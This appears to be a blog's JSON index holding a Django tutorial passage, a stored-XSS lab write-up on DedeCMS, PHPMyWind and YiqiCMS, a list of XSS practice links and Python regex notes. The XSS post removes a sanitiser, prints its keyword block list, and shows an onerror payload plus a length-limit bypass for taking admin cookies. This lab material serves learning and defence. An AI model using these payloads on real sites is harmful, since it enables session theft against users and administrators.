为一个工程创建一个虚拟环境 mkdir myproject cd myproject 这个文件夹是级别较高的目录，将存储与我们的Django项目相关的所有文件和东西，包括它的虚拟环境。所以让我们开始创建我们的第一个虚拟环境并安装django。 在myproject文件夹中： virtualenv venv -p python3.6 venv是虚拟环境的目录名，-p参数指定python3.6解析器的路径 要开始使用虚拟环境，其需要被激活： source venv/bin/activate 当在命令行前看到(venv),就代表激活成功，如图： 当我们venv开启后，pip程序也安装了，当使用期安装Python软件包（比如Django）时，它将安装在venv环境中 值得注意的是，在venv环境中，使用命令python（而不是python3.6）来调用python3.6.10，并且仅使用pip（而不是pip3）来安装软件包。 退出venv环境，使用命令： deactivate 安装Django 1.11.4很简单，现在我们已经启动了venv，运行以下命令来安装django 12345pip install django&#x3D;&#x3D;1.11.4# 译注：目前django已经升级到2.x版本，这里为了跟后续教程内容保持一直，所以必须指定版本号进行安装# 除非你有能力 debug，否则不建议你使用django 2.x，等你熟悉Django后，再升级都Django2.0 也不迟，因为两个版本的差异非常小 创建项目一切就绪 启动一个新项目 执行下面的命令来创建一个新的 Django 项目： django-admin startproject myproject 命令行工具django-admin会在安装Django的时候一起自动安装好。 执行了上面的命令以后，系统会为Django项目生成基础文件夹结构 myproject目录结构如下所示： myproject/ &lt;-- 高级别文件夹 |-- myproject/ &lt;-- Django项目文件夹 | |-- myproject/ | | |-- __init__.py | | |-- settings.py | | |-- urls.py | | |-- wsgi.py | +-- manage.py +-- venv/ &lt;-- 虚拟环境文件夹 最初的项目结构由五个文件组成： manage.py：使用django-admin命令行工具的快捷方式。它用于运行与我们项目相关的管理命令。我们将使用它来运行开发服务器，运行测试，创建迁移等等。 __init__.py：这个空文件告诉python这个文件夹是一个python包 settings.py：这个文件包含了所有的项目配置。将来我们会一直提到这个文件！ urls.py：这个文件负责映射我们项目中的路由和路径。例如，如果你想在访问URL / about/ 时显示某些内容，则必须先在这里做映射关系。 wsgi.py：该文件是用于部署的简单网关接口。你可以暂且先不用关心她的内容，就先让他在那里就好了。 django自带了一个简单的网络服务器。在开发过程中非常方便，所以我们无需安装任何其他软件即可在本地运行项目。我们可以通过执行命令来测试一下它： python manage.py runserver 结果图： ![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20420django09.png) 现在，你可以忽略终端中出现的迁移错误;我们将在稍后讨论。 现在在Web浏览器中打开URL：http://127.0.0.1:8000，你应该看到下面的页面： 使用组合键 Control + C来终止开发服务器。 Django应用在Django的哲学中，我们有两个重要的概念： app：是一个可以完成某件事情的Web应用程序。一个应用程序通常由一组models(数据库表)，views(视图)，templates(模板)，tests(测试)组成。 project：是配置和应用程序的集合。一个项目可以由多个应用程序或一个应用程序组成。 请注意，如果没有一个project，你就无法运行Django应用程序。像博客这样的简单网站可以完全在单个应用程序中编写，例如可以将其命名为blog或weblog。 这是组织源代码的一种方式。现在刚开始，判断什么是或不是应用程序这些还不太重要。包括如何组织代码等。现在不用担心那些问题！首先让我们对Django的API和基础知识进行梳理一遍。 为了方便说明，我们来创建一个简单的网络论坛或讨论区。要创建我们的第一个应用程序，请跳转到manage.py文件所在的目录并执行以下命令： django-admin startapp boards 注意!我们这次使用的命令是**startapp**。 通过这条指令，系统会给我们创建以下目录结构： myproject/ |-- myproject/ | |-- boards/ &lt;-- 我们新的Django应用（app）！ | | |-- migrations/ | | | +-- __init__.py | | |-- __init__.py | | |-- admin.py | | |-- apps.py | | |-- models.py | | |-- tests.py | | +-- views.py | |-- myproject/ | | |-- __init__.py | | |-- settings.py | | |-- urls.py | | |-- wsgi.py | +-- manage.py +-- venv/ 下面，我们来探讨每个文件的作用： migrations/：在这个文件夹里，Django会存储一些文件以跟踪你在models.py文件中创建的变更，用来保持数据库和models.py的同步。 admin.py：这个文件为一个django内置的应用程序Django Admin的配置文件。 apps.py：这是应用程序本身的配置文件。 models.py：这里是我们定义Web应用程序数据实例的地方。models会由Django自动转换为数据库表。 tests.py：这个文件用来写当前应用程序的单元测试。 views.py：这是我们处理Web应用程序请求(request)/响应(resopnse)周期的文件。 现在我们创建了我们的第一个应用程序，让我们来配置一下项目以便启用这个应用程序。 要做到这一点，打开settings.py并尝试找到INSTALLED_APPS变量： settings.py INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', ] 如你所见，Django默认已经安装了6个内置应用程序。它们提供大多数Web应用程序所需的常用功能，如身份验证，会话，静态文件管理（图像，JavaScript，CSS等）等。 我们将会在本系列教程中探索这些应用程序。但现在，先不管它们，只需将我们的应用程序boards添加到INSTALLED_APPS列表即可 INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'boards',# 译者注：建议和作者一样空一行来区别内置app和自定义的app, ] 使用前面漫画正方形和圆圈的比喻，黄色的圆圈就是我们的boards应用程序，django.contrib.admin, django.contrib.auth等就是红色的圆圈。 Hello World现在来写我们的第一个视图(view)，试试看看如何用Django创建一个新页面。 打开boards应用程序中的views.py文件，并添加以下代码： views.py 1234from django.http import HttpResponsedef home(request): return HttpResponse('Hello, World!') 视图是接收httprequest对象并返回一个httpresponse对象的Python函数。接收 request作为参数并返回response 作为结果。这个流程你必须记住！ 上面定义了一个简单的视图，命名为home,它简单返回一个信息字符串hello,world! Django调用这个view。是在urls.py文件中完成： urls.py 123456789from django.conf.urls import urlfrom django.contrib import adminfrom boards import viewsurlpatterns = [ url(r'^$',views.home,name='home'), url(r'^admin/',admin.site.urls),] 将上面的代码片段与你的urls.py文件进行比较，你会注意到我添加了以下新代码：url（r&#39;^ $&#39;，views.home，name =&#39;home&#39;，并通过from boards import views从我们的应用程序boards中导入了views模块 Django使用正则表达式来匹配请求的URL，对于我们的home视图，我使用^$正则，它将匹配一个空路径，也就是主页（这个URL：http://127.0.0.1:8000）。如果我想匹配的URL是 http://127.0.0.1:8000/homepage/，那么我的URL正则表达式就会是：url(r&#39;^homepage/$&#39;, views.home, name=&#39;home&#39;)。 回到manage.py目录，运行 python manage.py runserver 并在Web浏览器中，打开 http://127.0.0.1:8000 总结这是本系列学习的第一部分。本文，学习了如何安装相应的Python版本以及如何设置开发环境。还介绍了虚拟环境，开始了第一个django项目，并已经创建了我们的初始应用程序。 下部分将学习它的模型，视图，模板和URLs。学习探索Django所有的基础知识！","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web框架","slug":"python/Web框架","permalink":"https://fishni.github.io/categories/python/Web%E6%A1%86%E6%9E%B6/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"Web框架","slug":"Web框架","permalink":"https://fishni.github.io/tags/Web%E6%A1%86%E6%9E%B6/"}]},{"title":"【XSS（一）】1.3 存储型XSS多场景实践及绕过","slug":"1.3 存储型XSS多场景实践及Bypass","date":"2020-04-15T16:00:00.000Z","updated":"2020-04-17T00:49:16.052Z","comments":true,"path":"2020/04/16/1.3 存储型XSS多场景实践及Bypass/","link":"","permalink":"https://fishni.github.io/2020/04/16/1.3%20%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E5%A4%9A%E5%9C%BA%E6%99%AF%E5%AE%9E%E8%B7%B5%E5%8F%8ABypass/","excerpt":"本文选取了DedeCMS_v5.7（存储型XSS）、phpmywind5.3（存储型XSS,编辑后触发）、Yiqicms1.9（存储型XSS,多次提交绕过)等进行了环境的复现、漏洞的绕过、漏洞的验证、漏洞的简单修复、及利用","text":"本文选取了DedeCMS_v5.7（存储型XSS）、phpmywind5.3（存储型XSS,编辑后触发）、Yiqicms1.9（存储型XSS,多次提交绕过)等进行了环境的复现、漏洞的绕过、漏洞的验证、漏洞的简单修复、及利用 0x01 存储型XSS1.1 DedeCMS_v5.7 下载地址： 链接：https://pan.baidu.com/s/116RsJoRbQ9rpVaq_64QUqA 提取码：eiuo 本地环境配置 windows+phpstudy+php5.4.45 将下载后的软件放于WWW目录下,按步骤安装即可 测试说明 上述下载的版本存在的XSS漏洞以及修复，但是亦可能存在未发现的XSS漏洞，此博文为了理解XSS原理，以便自身对XSS测试思路理解 在已修复状态下，复现漏洞环境，并分析修复代码 复现的漏洞要求： 该漏洞 通过用户在编写订单收货地址的相关参数 注入 XSS Payload，导致 前台查看订单的页面和后台管理员查看订单详情的页面都会被 XSS。 所以说，可以用来打管理员 Cookie 。 准备： 1.首先管理员登录后台/dede，添加商品销售栏目 2.为商品栏目添加一个商品 前台用户选定商品添加购物车：（这里方便测试，选定admin用户） 前台用户编辑订单的收货地址，在这里 address,des,email,postname 都是存在 XSS 的，插入 XSS Payload 查看订单详情，发现插入的XSS Payload都被过滤(说明在提交订单后，对订单内容进行了XSS过滤) 由于订单页面：carbuyaction.php，本地文件查看找到如下代码 12345678$address = cn_substrR(trim(RemoveXSS($address)),200);$des = cn_substrR(RemoveXSS($des),100);$postname = cn_substrR(trim(RemoveXSS($postname)),15);$tel = preg_replace(\"#[^-0-9,\\/\\| ]#\", \"\", $tel);$zip = preg_replace(\"#[^0-9]#\", \"\", $zip);$email = cn_substrR(RemoveXSS($email),255);if(empty($tel)) 分析：这段代码分别进行了，RemoveXSS、trim、cn_substrR等相应处理，先将地址的RemoveXSS函数过滤去掉，再进行XSS payload提交 再次，提交商品，查看提交XSS payload的订单详情 分析：发现未使用RemoveXSS函数过滤时，地址存在XSS漏洞 查看后台管理员中，商品订单记录 RemoveXSS函数查找 添加如下代码放置对应文件中(carbuyaction.php）,重新提交订单，即可显示函数具体位置 //测试RemoveXSS位置 $func = new ReflectionFunction(‘RemoveXSS’); var_dump($func-&gt;getFileName()); 查找结果 RemoveXSS代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041function RemoveXSS($val) &#123; $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val); $search = 'abcdefghijklmnopqrstuvwxyz'; $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'; $search .= '1234567890!@#$%^&amp;*()'; $search .= '~`\";:?+/=&#123;&#125;[]-_|\\'\\\\'; for ($i = 0; $i &lt; strlen($search); $i++) &#123; $val = preg_replace('/(&amp;#[xX]0&#123;0,8&#125;'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ; $val = preg_replace('/(&amp;#0&#123;0,8&#125;'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; &#125; $ra1 = array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base'); $ra2 = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); $ra = array_merge($ra1, $ra2); $found = true; while ($found == true) &#123; $val_before = $val; for ($i = 0; $i &lt; sizeof($ra); $i++) &#123; $pattern = '/'; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) &#123; if ($j &gt; 0) &#123; $pattern .= '('; $pattern .= '(&amp;#[xX]0&#123;0,8&#125;([9ab]);)'; $pattern .= '|'; $pattern .= '|(&amp;#0&#123;0,8&#125;([9|10|13]);)'; $pattern .= ')*'; &#125; $pattern .= $ra[$i][$j]; &#125; $pattern .= '/i'; $replacement = substr($ra[$i], 0, 2).'&lt;x&gt;'.substr($ra[$i], 2); $val = preg_replace($pattern, $replacement, $val); if ($val_before == $val) &#123; $found = false; &#125; &#125; &#125; return $val;&#125; 1.2 PHPMyWind_5.3 下载地址： 链接：https://pan.baidu.com/s/1ujXDwr4KOcd1iwbtJlnhEg 提取码：3n1n 采用字符串6666”;!–’=&amp;{()}&lt;&gt;6666`作为简洁探测XSS注入点。注入后查看页面源代码并且寻找是否存在666&amp;quot;等字样来确认是否存在漏洞 后台查看留言模块，对留言进行修改 审查留言，右键点击框架源代码，并搜索6666查看输入位置，并分析 分析：过滤了双引号，左右尖括号 查看本地文件，(message.php)，找到如下代码 12$contact = htmlspecialchars($contact);$content = htmlspecialchars($content); 分析：可知对输入内容利用htmlspecialchars进行了HTML实体转换 跟进content参数。PHPMyWind_5.3/admin/message_update.php 12345678910111213141516171819202122232425262728&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt;&lt;title&gt;修改留言&lt;/title&gt;&lt;link href=\"templates/style/admin.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;&lt;script type=\"text/javascript\" src=\"templates/js/jquery.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"templates/js/checkf.func.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"editor/kindeditor-min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src=\"editor/lang/zh_CN.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$row = $dosql-&gt;GetOne(\"SELECT * FROM `#@__message` WHERE `id`=$id\");?&gt;&lt;div class=\"formHeader\"&gt; &lt;span class=\"title\"&gt;修改留言&lt;/span&gt; &lt;a href=\"javascript:location.reload();\" class=\"reload\"&gt;刷新&lt;/a&gt; &lt;/div&gt;&lt;form name=\"form\" id=\"form\" method=\"post\" action=\"message_save.php\"&gt; &lt;table width=\"100%\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\" class=\"formTable\"&gt; &lt;tr&gt; &lt;td width=\"25%\" height=\"40\" align=\"right\"&gt;用户名：&lt;/td&gt; &lt;td width=\"75%\"&gt;&lt;strong&gt;&lt;?php echo $row['nickname'] ?&gt;&lt;/strong&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"40\" align=\"right\"&gt;联系方式：&lt;/td&gt; &lt;td&gt;&lt;input type=\"text\" name=\"contact\" id=\"contact\" class=\"input\" value=\"&lt;?php echo $row['contact'] ?&gt;\" /&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td height=\"198\" align=\"right\"&gt;留言内容：&lt;/td&gt; &lt;td&gt;&lt;textarea name=\"content\" id=\"content\"&gt;&lt;?php echo $row['content'] ?&gt;&lt;/textarea&gt; &lt;script&gt; 这行代码&lt;td&gt;&lt;textarea name=&quot;content&quot; id=&quot;content&quot;&gt;&lt;?php echo $row[&#39;content&#39;] ?&gt;&lt;/textarea&gt;后台直接取出content参数,数据并未进行转义操作。PHPMyWind_5.3/shoppingcart.php 留言板地址以ing开头(可以是其他) 构造XSS payload：&quot;&gt;&lt;img src=x onerror=alert(2001)&gt;&lt;&quot;也即注入留言内容中 1.3 yiqicms-v1.9-20150904 下载链接 链接：https://pan.baidu.com/s/1yGBVYMzt8SSXLum2ykcEaA提取码：4q0a 前期XSS注入点探测省略，直接对留言标题进行XSS payload提交 后台查看在线留言列表，弹出1,留言详情查看也会弹出1，F12审查元素 但是在利用的过程中如果是弹出cookie的话，发现有长度限制，尝试是否可以通过多次提交，使用/ /的方式绕过。 第一次提交： 第二次提交： 查看留言列表，成功弹窗cookie信息，F12审查元素 综上更多的利用方式，亦可以在一定长度下进行多次提交，巧妙利用注释 审查comment.php,对输入信息仅进行了长度限制 123456789101112131415161718192021222324252627if(!preg_match(\"/^.&#123;1,30&#125;$/\",$msgtitle)) &#123; ShowMsg(\"请输入正确的标题\"); exit(); &#125; if(!preg_match(\"/^.&#123;1,10&#125;$/\",$msgname)) &#123; ShowMsg(\"请输入您的姓名\"); exit(); &#125; if(!preg_match(\"/^.&#123;1,20&#125;$/\",$msgcontact)) &#123; ShowMsg(\"请输入正确的联系方式\"); exit(); &#125; if(!preg_match(\"/^.&#123;1,200&#125;$/\",$msgcontent)) &#123; ShowMsg(\"请输入正确的留言内容\"); exit(); &#125; $msgcontent = safeCheck($msgcontent); $userip = $_SERVER[\"REMOTE_ADDR\"];; $sql = \"INSERT INTO yiqi_comments (cid ,title ,name,contact,content,ip,adddate)\" . \"VALUES (NULL, '$msgtitle', '$msgname', '$msgcontact','$msgcontent', '$userip', null)\"; $result = $yiqi_db-&gt;query(CheckSql($sql)); 参考链接 https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS https://www.seebug.org/vuldb/ssvid-89295","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【XSS（一）】1.4 XSS相关资料搜集","slug":"1.4 XSS相关资料搜集","date":"2020-04-15T16:00:00.000Z","updated":"2020-04-17T02:18:58.464Z","comments":true,"path":"2020/04/16/1.4 XSS相关资料搜集/","link":"","permalink":"https://fishni.github.io/2020/04/16/1.4%20XSS%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%90%9C%E9%9B%86/","excerpt":"本文主要是一些XSS练习平台、XSS相关知识、或者总结的参考资料搜集。。。","text":"本文主要是一些XSS练习平台、XSS相关知识、或者总结的参考资料搜集。。。 XSS总结参考链接： 【xss总结】https://xz.aliyun.com/t/4067#toc-0 https://html5sec.org/ 【xss总结】https://blog.csdn.net/qq_29277155/article/details/51320064 【xss-payload】https://owasp.org/www-community/xss-filter-evasion-cheatsheet XSS练习平台1 参考网址：http://test.ctf8.com/ 参考答案： https://blog.csdn.net/tutucoo/article/details/104151403 https://www.cnblogs.com/bmjoker/p/9446472.html XSS练习平台2 链接地址：http://xss-quiz.int21h.jp/ 参考答案：https://blog.csdn.net/taozijun/article/details/81277187 XSS练习平台3 链接地址：http://prompt.ml/0 参考答案： https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml https://blog.csdn.net/Ni9htMar3/article/details/77938899 XSS练习平台4 链接地址：https://alf.nu/alert1 参考答案：https://www.cnblogs.com/omnis/p/9084461.html 待续………","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【python-正则】1.2Python正则表达式学习-2","slug":"1.2 Python正则表达式学习-2","date":"2020-04-13T16:00:00.000Z","updated":"2020-04-14T08:56:07.742Z","comments":true,"path":"2020/04/14/1.2 Python正则表达式学习-2/","link":"","permalink":"https://fishni.github.io/2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/","excerpt":"本文主要是对Python正则相关知识，进行简单的梳理","text":"本文主要是对Python正则相关知识，进行简单的梳理 0x01 正则表达式语法1.1 字符与字符类1.特殊字符：\\.^$?+*{}[]()| 以上特殊字符要表示字面值，必须使用\\进行转义 2.字符类 包含在[]中的一个或者多个字符被称为字符类，字符类在匹配时如果没有指定量词则只会匹配其中的一个。 字符类内可以指定范围，比如[a-zA-Z0-9]表示a到z，A到Z，0到9之间的任何一个字符 左方括号后跟随一个^，表示否定一个字符类，比如[^0-9]表示可以匹配一个任意非数字的字符。 字符类内部，除了\\之外，其他特殊字符不再具备特殊意义，都表示字面值。^放在第一个位置表示否定，放在其他位置表示^本身，-放在中间表示范围，放在字符类中的第一个字符，则表示-本身。 字符类内部可以使用速记法，比如\\d \\s \\w 3.速记法 . 可以匹配除换行符之外的任何字符，如果有re.DOTALL标志，则匹配任意字符包括换行 \\d匹配一个Unicode数字，如果带re.ASCII，则匹配0-9 \\D匹配Unicode非数字 \\s 匹配Unicode空白，如果带有re.ASCII，则匹配\\t\\n\\r\\f\\v中的一个 \\S 匹配Unicode非空白 \\w匹配Unicode单词字符，如果带有re.ascii,则匹配[a-zA-Z0-9_]中的一个 \\W匹配Unicode非单词字符 1.2 量词 ? 匹配前面的字符0次或1次 * 匹配前面的字符0次或多次 + 匹配前面的字符1次或者多次 {m} 匹配前面表达式m次 {m,} 匹配前面表达式至少m次 {,n} 匹配前面的正则表达式最多n次 {m,n} 匹配前面的正则表达式至少m次，最多n次 注意点：以上量词都是贪婪模式，会尽可能多的匹配，如果要改为非贪婪模式，通过在量词后面跟随一个?来实现 1.3 组与捕获1.()的作用 捕获()中正则表达式内容以备进一步利用处理，可以通过在左括号后面跟随?:来关闭括号的捕获功能 将正则表达式的一部分内容进行组合，方便使用量词或者| 2.反向引用前面()内捕获的内容 通过组号反向引用 每一个没有使用?:的小括号都会分配一个组好，从1开始，从左到右递增，可以通过\\i引用前面()内表达式捕获的内容 通过组名反向引用前面小括号内捕获的内容 可以通过在左括号后面跟随?P&lt;name&gt;,尖括号中放入组名来为一个组起一个别名，后面通过(?P=name)来引用 前面捕获的内容。如(?P&lt;word&gt;\\w+)\\s+(?P=word)来匹配重复的单词。 注意点：反向引用不能放在字符类[]中使用 1.4 断言与标记断言不会匹配任何文本，只是对断言所在的文本施加某些约束 1.常用断言 \\b 匹配单词的边界，放在字符类[]中则表示backspace \\B 匹配非单词边界，受ASCII标记影响 \\A 在起始处匹配 ^ 在起始处匹配，如果有MULTILINE标志，则在每个换行符后匹配 \\Z 在结尾处匹配 $在结尾处匹配，如果有MULTILINE标志，则在每个换行符前匹配 (?=e) 正前瞻 (?!e) 负前瞻 (?&lt;=e) 正回顾 (?&lt;!e)负回顾 2.前瞻回顾的解释 前瞻： exp1(?=exp2) exp1后面的内容要匹配exp2 负前瞻: exp1(?!exp2) exp1后面的内容不能匹配exp2 后顾: (?&lt;=exp2)exp1 exp1前面的内容要匹配exp2 负后顾: (?&lt;!exp2)exp1 exp1前面的内容不能匹配exp2 例如：我们要查找hello，但是hello后面必须是world，正则表达式可以这样写：”(hello)\\s+(?=world)”,用来匹配”hello wangxing”和”hello world”只能匹配到后者的hello 12import rere.match(\"(hello)\\s+(?=world)\",\"hello world\").group() &apos;hello &apos;1re.match(\"(hello)\\s+(?=world)\",\"hello dd\").group() --------------------------------------------------------------------------- AttributeError Traceback (most recent call last) &lt;ipython-input-5-07f0304e6ee4&gt; in &lt;module&gt; ----&gt; 1 re.match(&quot;(hello)\\s+(?=world)&quot;,&quot;hello dd&quot;).group() AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;1.5 条件匹配(?(id)yes_exp|no_exp) 对应id的子表达式如果匹配到内容，则这里匹配yes_exp，否则匹配no_exp 1re.match(r\"(123)qwe(?(1)456|789)\", \"123qwe456\").group() &apos;123qwe456&apos;1.6 正则表达式的标志 正则表达式的标志有两种使用方法 通过给compile方法传入标志参数，多个标志使用|分割的方法,如re.compile(r”#[\\da-f]{6}\\b”, re.IGNORECASE|re.MULTILINE) 通过在正则表达式前面添加(?标志)的方法给正则表达式添加标志，如(?ms)#[\\da-z]{6}\\b 常用的标志 re.A或者re.ASCII， 使\\b \\B \\s \\S \\w \\W \\d \\D都假定字符串为假定字符串为ASCII re.I或者re.IGNORECASE 使正则表达式忽略大小写 re.M或者re.MULTILINE 多行匹配，使每个^在每个回车后，每个$在每个回车前匹配 re.S或者re.DOTALL 使.能匹配任意字符，包括回车 re.X或者re.VERBOSE 这样可以在正则表达式跨越多行，也可以添加注释，但是空白需要使用\\s,或者[ ]来表示，因为默认的空白不再解释。如： 123456789charref = re.compile(r\"\"\" &amp;[#] # Start of a numeric entity reference ( 0[0-7]+ # Octal form | [0-9]+ # Decimal form | x[0-9a-fA-F]+ # Hexadecimal form ) ; # Trailing semicolon\"\"\", re.VERBOSE) 0x02 Python正则表达式模块2.1 正则表达式处理字符串主要四大功能 匹配：查看一个字符串是否符合正则表达式的语法，一般返回true或者false 获取： 正则表达式来提取字符串中符合要求的文本 替换 查找字符串中符合正则表达式的文本，并用相应的字符串替换 分割 使用正则表达式对字符串进行分割。 2.2 Python中re模块使用正则表达式的两种方法 使用re.compile(r, f)方法生成正则表达式对象，然后调用正则表达式对象的相应方法。这种做法的好处是生成正则对象之后可以多次使用。 re模块中对正则表达式对象的每个对象方法都有一个对应的模块方法，唯一不同的是传入的第一个参数是正则表达式字符串。此种方法适合于只使用一次的正则表达式。 2.3 正则表达式对象的常用方法 rx.findall(s,start, end) 返回一个列表，如果正则表达式中没有分组，则列表中包含的是所有匹配的内容，如果正则表达式中有分组，则列表中的每个元素是一个元组，元组中包含子分组中匹配到的内容，但是没有返回整个正则表达式匹配的内容 ​ rx.finditer(s, start, end) 返回一个可迭代对象对可迭代对象进行迭代，每一次返回一个匹配对象，可以调用匹配对象的group()方法查看指定组匹配到的内容，0表示整个正则表达式匹配到的内容 rx.search(s, start, end) 返回一个匹配对象,倘若没匹配到，就返回None search方法只匹配一次就停止，不会继续往后匹配 rx.match(s, start, end) 如果正则表达式在字符串的起始处匹配，就返回一个匹配对象，否则返回None rx.sub(x, s, m) 返回一个字符串。每一个匹配的地方用x进行替换，返回替换后的字符串，如果指定m，则最多替换m次。对于x可以使用/i或者/gid可以是组名或者编号来引用捕获到的内容。 模块方法re.sub(r, x, s, m)中的x可以使用一个函数。此时我们就可以对捕获到的内容推过这个函数进行处理后再替换匹配到的文本。 rx.subn(x, s, m) 与re.sub()方法相同，区别在于返回的是二元组，其中一项是结果字符串，一项是做替换的个数。 rx.split(s, m) 分割字符串,返回一个列表，用正则表达式匹配到的内容对字符串进行分割 如果正则表达式中存在分组，则把分组匹配到的内容放在列表中每两个分割的中间作为列表的一部分，如： 1234rx = re.compile(r\"(\\d)[a-z]+(\\d)\")s = \"ab12dk3klj8jk9jks5\"result = rx.split(s)result [&apos;ab1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;klj&apos;, &apos;8&apos;, &apos;9&apos;, &apos;jks5&apos;] rx.flags() 正则表达式编译时设置的标志 rx.pattern() 正则表达式编译时使用的字符串 2.4 匹配对象的属性与方法 m.group(g, …) 返回编号或者组名匹配到的内容，默认或者0表示整个表达式匹配到的内容，如果指定多个，就返回一个元组 m.groupdict(default) 返回一个字典。字典的键是所有命名的组的组名，值为命名组捕获到的内容 如果有default参数，则将其作为那些没有参与匹配的组的默认值。 m.groups(default) 返回一个元组。包含所有捕获到内容的子分组，从1开始，如果指定了default值，则这个值作为那些没有捕获到内容的组的值 m.lastgroup() 匹配到内容的编号最高的捕获组的名称，如果没有或者没有使用名称则返回None(不常用) m.lastindex() 匹配到内容的编号最高的捕获组的编号，如果没有就返回None m.start(g) 当前匹配对象的子分组是从字符串的那个位置开始匹配的,如果当前组没有参与匹配就返回-1 m.end(g) 当前匹配对象的子分组是从字符串的那个位置匹配结束的，如果当前组没有参与匹配就返回-1 m.span() 返回一个二元组，内容分别是m.start(g)和m.end(g)的返回值 m.re() 产生这一匹配对象的正则表达式 m.string() 传递给match或者search用于匹配的字符串 m.pos() 搜索的起始位置。即字符串的开头，或者start指定的位置(不常用) m.endpos() 搜索的结束位置。即字符串的末尾位置，或者end指定的位置(不常用) 2.5 总结 对于正则表达式的匹配功能，Python没有返回true和false的方法，但可以通过对match或者search方法的返回值是否是None来判断 对于正则表达式的搜索功能，如果只搜索一次可以使用search或者match方法返回的匹配对象得到，对于搜索多次可以使用finditer方法返回的可迭代对象来迭代访问 对于正则表达式的替换功能，可以使用正则表达式对象的sub或者subn方法来实现，也可以通过re模块方法sub或者subn来实现，区别在于模块的sub方法的替换文本可以使用一个函数来生成 对于正则表达式的分割功能，可以使用正则表达式对象的split方法，需要注意如果正则表达式对象有分组的话，分组捕获的内容也会放到返回的列表中 参考链接 正则表达式HOWTO https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto re-模块操作 https://docs.python.org/zh-cn/3/library/re.html 